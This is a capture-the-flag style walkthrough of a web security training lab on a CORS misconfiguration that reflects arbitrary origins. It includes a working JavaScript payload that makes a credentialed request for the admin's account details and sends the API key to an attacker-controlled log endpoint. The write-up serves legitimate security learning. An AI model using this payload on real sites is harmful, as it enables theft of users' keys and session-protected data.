**CORS || Lab#1 || CORS vulnerability with basic origin reflection**

<img width="781" height="442" alt="image" src="https://github.com/user-attachments/assets/d2f816c6-6057-4ef3-b17e-f7f0781c87ca" />

Goal of this lab is to exploit the CORS misconfiguration to retrieve the admin API key. 

Credentials: wiener : peter

Lets start the lab and login

<img width="930" height="330" alt="image" src="https://github.com/user-attachments/assets/44be2cf1-8117-4dc7-ade7-60c2ac2a14f1" />

Lets check this traffic in Burpsuite

<img width="1000" height="367" alt="image" src="https://github.com/user-attachments/assets/faed1e22-c57e-4a1f-a2e3-65cff504975b" />

There is a request /accountDetails which is in JSON. In the respond we can see apikey of the user and Access-Control-Allow-Credentials is true. 

Lets move this traffic to Repeater

<img width="737" height="427" alt="image" src="https://github.com/user-attachments/assets/e866088d-58c2-4ea5-9bb5-a01ed5031081" />

Now we have to test for CORS misconfiguration. 

1. Change the origin to an arbitrary value. 

Lets add the Origin header and see if the application accepts it. 

If application accepts it, it means application is accepting any random webpage on the internet to access it data.

<img width="1000" height="384" alt="image" src="https://github.com/user-attachments/assets/bab25ae9-4146-43fc-a581-81694afe9b39" />

We got a 200 Ok response and can see Access-Control-Allow-Origin is set to our URL and Access-Control-Allow-Credentials is true. 

The application is dynamically extracting the origin without checking it and reflecting it back to the user in Access-Control-Allow-Origin header. 

Also Access-Control-Allow-Credentials is true which means we are allowed to reach credentials, like session cookies as well.

So the application allows arbitrary origin to access the website and vulnerable.

Now, we will create a script and send it to Admin user. When Admin clicks on the link, due to misconfiguration in CORS, we will get its API key.

```
<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
 req.withCredentials = true;
 req.send();
function reqListener() {
 location='/log?key='+this.responseText;
 };
</script>
```

We have to put our lab ID in the script.

<img width="1000" height="430" alt="image" src="https://github.com/user-attachments/assets/74ee6e26-300f-485d-897d-44b7b9a9f6b0" />

Go to exploit server and put the script in the Body.

<img width="1000" height="320" alt="image" src="https://github.com/user-attachments/assets/db208332-d93d-4108-90ad-3f172e825709" />

Click on Store and Deliver exploit to victim. 

Now, the Administrator user will receive the exploit and will click on it. 

Click on Access log

<img width="1000" height="56" alt="image" src="https://github.com/user-attachments/assets/6136ddd1-0ce1-45a6-935a-7b6fc94a0a9c" />

The key is URL encoded. Lets decode it

<img width="1000" height="335" alt="image" src="https://github.com/user-attachments/assets/33502510-5f1e-4a3a-9022-9df89824499b" />

We got the Administrator API Key.

For solving the lab, we have to submit the Administrator apikey.

<img width="1000" height="430" alt="image" src="https://github.com/user-attachments/assets/aa068790-313c-422a-bf12-e9f835b4bb27" />

And lab is solved

<img width="1000" height="417" alt="image" src="https://github.com/user-attachments/assets/423ed556-ae61-4397-90ad-d94625c40501" />




